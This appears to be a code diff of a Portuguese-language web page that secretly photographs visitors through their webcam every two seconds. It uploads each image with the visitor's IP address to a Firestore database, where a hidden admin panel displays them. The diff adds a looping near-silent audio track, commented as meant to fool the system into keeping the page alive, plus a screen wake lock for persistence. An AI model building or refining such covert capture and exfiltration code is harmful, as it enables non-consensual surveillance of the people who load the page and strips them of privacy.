@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Monitoramento Pro Realtime</title>
+    <title>Monitoramento Pro - Ultra Persistência</title>
     <style>
         body { font-family: sans-serif; background: #000; color: white; margin: 0; overflow: hidden; }
         #admin-area { position: absolute; top: 10px; left: 10px; z-index: 100; }
@@ -17,43 +17,34 @@
         #grid-monitores { 
             display: grid; 
             grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); 
-            gap: 10px; 
-            margin-top: 10px;
-            max-height: 80vh;
-            overflow-y: auto;
-            width: 350px;
+            gap: 10px; margin-top: 10px; max-height: 80vh; overflow-y: auto; width: 350px;
         }
-        .monitor-card { 
-            background: #111; 
-            border: 1px solid #444; 
-            border-radius: 5px; 
-            padding: 5px; 
-            position: relative;
-        }
-        .monitor-card img { width: 100%; border-radius: 3px; filter: grayscale(0); transition: 0.3s; }
-        .offline img { filter: grayscale(1) opacity(0.5); }
+        .monitor-card { background: #111; border: 1px solid #444; border-radius: 5px; padding: 5px; }
+        .monitor-card img { width: 100%; border-radius: 3px; }
         .status-dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; margin-right: 5px; }
         .online .status-dot { background: #00ff00; box-shadow: 0 0 5px #00ff00; }
         .offline .status-dot { background: #ff0000; }
-        .monitor-info { font-size: 10px; display: block; margin-bottom: 4px; }
     </style>
 </head>
 <body>
 
-    <video id="webcam" autoplay playsinline></video>
+    <video id="webcam" autoplay playsinline muted></video>
     <canvas id="canvas-foto"></canvas>
+    <audio id="silent-audio" loop>
+        <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg">
+    </audio>
 
     <div id="admin-area">
         <div id="form-login" class="login-box">
             <input type="text" id="usuario" placeholder="User">
             <input type="password" id="senha" placeholder="Pass">
-            <button onclick="verificarAdmin()">ACESSAR MONITORAMENTO</button>
+            <button onclick="verificarAdmin()">ACESSAR PAINEL</button>
         </div>
 
         <div id="painel-admin" class="hidden">
             <div class="login-box">
                 <div style="display:flex; justify-content: space-between; align-items:center;">
-                    <span style="color:#007bff; font-size: 11px;">LIVE IPS ATIVOS</span>
+                    <span style="font-size: 11px;">MODO PERSISTENTE ATIVO</span>
                     <button onclick="location.reload()" style="background:#d9534f; padding: 2px 8px;">Sair</button>
                 </div>
                 <div id="grid-monitores"></div>
@@ -75,9 +66,14 @@
         const db = firebase.firestore();
         let meuIP = "descobrindo...";
 
-        // Tenta manter a tela acesa
-        async function ativarWakeLock() {
-            try { if ('wakeLock' in navigator) { await navigator.wakeLock.request('screen'); } } catch (e) {}
+        // Função para manter o áudio rodando (mesmo mudo) para enganar o sistema
+        function manterProcessoVivo() {
+            const audio = document.getElementById('silent-audio');
+            audio.volume = 0.01; // Quase mudo
+            audio.play().catch(() => {
+                // Se o navegador bloquear o autoplay, tentamos ao primeiro clique
+                window.addEventListener('click', () => audio.play(), { once: true });
+            });
         }
 
         fetch('https://api.ipify.org?format=json')
@@ -89,10 +85,12 @@
 
         async function iniciarApp() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                 document.getElementById('webcam').srcObject = stream;
-                ativarWakeLock();
-                // Envia foto e sinal de vida a cada 2 segundos
+                manterProcessoVivo();
+                
+                if ('wakeLock' in navigator) { await navigator.wakeLock.request('screen').catch(()=>{}); }
+
                 setInterval(capturarEAtualizar, 2000);
             } catch (err) { console.error(err); }
         }
@@ -108,7 +106,7 @@
                 
                 db.collection("ips_ativos").doc(meuIP).set({
                     ip_original: meuIP.replace(/_/g, '.'),
-                    last_ping: Date.now(), // Timestamp para verificar se saiu
+                    last_ping: Date.now(),
                     imagem: fotoBase64
                 });
             }
@@ -127,20 +125,14 @@
             db.collection("ips_ativos").onSnapshot((snapshot) => {
                 grid.innerHTML = "";
                 const agora = Date.now();
-                
                 snapshot.forEach((doc) => {
                     const dados = doc.data();
-                    const diff = (agora - dados.last_ping) / 1000;
-                    const isOnline = diff < 10; // Se não enviou sinal há 10s, está offline
-
+                    const isOnline = (agora - dados.last_ping) / 1000 < 10;
                     const card = document.createElement('div');
                     card.className = `monitor-card ${isOnline ? 'online' : 'offline'}`;
                     card.innerHTML = `
-                        <span class="monitor-info">
-                            <span class="status-dot"></span>IP: ${dados.ip_original}
-                        </span>
+                        <span style="font-size:10px;"><span class="status-dot"></span>IP: ${dados.ip_original}</span>
                         <img src="${dados.imagem}">
-                        <div style="font-size:8px; margin-top:3px;">${isOnline ? 'CONECTADO' : 'FOI EMBORA/MINIMIZOU'}</div>
                     `;
                     grid.appendChild(card);
                 });
